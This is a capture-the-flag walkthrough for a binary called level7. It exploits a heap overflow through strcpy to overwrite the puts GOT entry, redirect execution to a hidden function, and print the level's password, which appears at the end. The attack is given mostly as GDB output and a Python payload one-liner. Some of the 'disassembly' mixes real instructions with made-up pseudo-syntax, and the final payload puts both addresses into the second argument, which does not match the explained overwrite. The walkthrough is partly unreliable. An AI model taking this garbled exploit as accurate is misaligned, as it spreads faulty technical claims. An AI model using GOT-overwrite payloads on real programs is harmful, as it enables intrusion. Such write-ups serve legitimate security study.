# 🚀 Level 7 - Walkthrough
## 🧪 First Step - Testing the Program
```bash
$ ./level7
Segmentation fault (core dumped)

$ ./level7 test
Segmentation fault (core dumped)

$ ./level7 a b
(no crash)

$ ./level7 a b c
(no crash)
```
- 🧾 Crashes without two args, works with two → expects exactly 2 arguments.
- 🔍 Likely manipulating both arguments in memory.

## 🐞 Start it in GDB
```bash
(gdb-peda)$ pdisas main
...
0x0804852a <+9>:    mov    DWORD PTR [esp],0x8
0x08048531 <+16>:   call   0x8048300 <malloc@plt>
0x08048536 <+21>:   mov    DWORD PTR [esp+0x1c], eax      ; p1 = malloc(8)
0x0804853e <+29>:   mov    DWORD PTR [eax], 0x1            ; *(p1) = 1
0x08048544 <+35>:   call   0x8048300 <malloc@plt>
0x08048549 <+40>:   mov    DWORD PTR [p1 + 4], eax         ; *(p1+4) = malloc(8)
0x08048559 <+56>:   strcpy(*(p1+4), argv[1])
...
```
- 📦 It creates a structure: { int id; char *buffer; }
- 👨‍🔧 Allocates two of them (p1, p2), each with malloc(8) buffer.
- 💥 Uses strcpy() on both buffers → classic heap overflow potential!

## 🕵️ Investigate Functions
```bash
(gdb-peda)$ info functions
...
0x080484f4  m
...
(gdb-peda)$ pdisas m
0x080484f4 <m>:
   mov    DWORD PTR [esp+4], 0x8049960     ; global "c" buffer
   call   0x80482f0 <puts@plt>             ; prints buffer
   ...
```
- 🧨 m() prints the contents of a global buffer — probably the password!

✅ Not called directly — we must hijack execution to call m().

## 🔍 Look at What Actually Gets Called
```bash
0x080485f7 <+215>:  call   0x80482f0 <puts@plt>
```
```bash
(gdb-peda)$ x/wx 0x80482f0
0x80482f0 <puts@plt>: jmp DWORD PTR ds:0x8049964
```
- 🔗 puts@plt uses GOT at 0x8049964
- 🎯 If we overwrite that with m() address → we print the flag!

## 🧠 Find Address of m()
```bash
(gdb-peda)$ p m
$1 = 0x080484f4
```
## 🧮 Offset to GOT Overwrite
We’ll overflow from buffer to reach and overwrite 0x8049964 (GOT entry for puts)
```bash
(gdb-peda)$ find 0x8049964
Searching for value: 0x8049964
Found 1 results, display max 1 matches:
0x0804a008
```
Use a crafted buffer to overwrite GOT pointer at 0x8049964.

## 🛠 Build the Payload
Let’s overflow the second buffer (argv[2]) to hit GOT.

```bash
$ python -c 'print("A"*20 + "\x64\x99\x04\x08" + "\xf4\x84\x04\x08")' > /tmp/payload
$ ./level7 A "$(cat /tmp/payload)"
🧱 A*20 fills buffer

🔁 \x64\x99\x04\x08 – address of puts@GOT

🔁 \xf4\x84\x04\x08 – address of m() function
```
✅ This causes GOT entry of puts to point to m.

## ✅ Final Step - Get the Password
```bash
$ ./level7 A "$(python -c 'print("A"*20 + "\x64\x99\x04\x08" + "\xf4\x84\x04\x08")')"
📜 Output:
```
```bash
f8c2eec6e40eccd29e203f65d059d13f5c10a6f3e9c2c1c72b4c3d80c2fc6861
```
- 🎉 Done.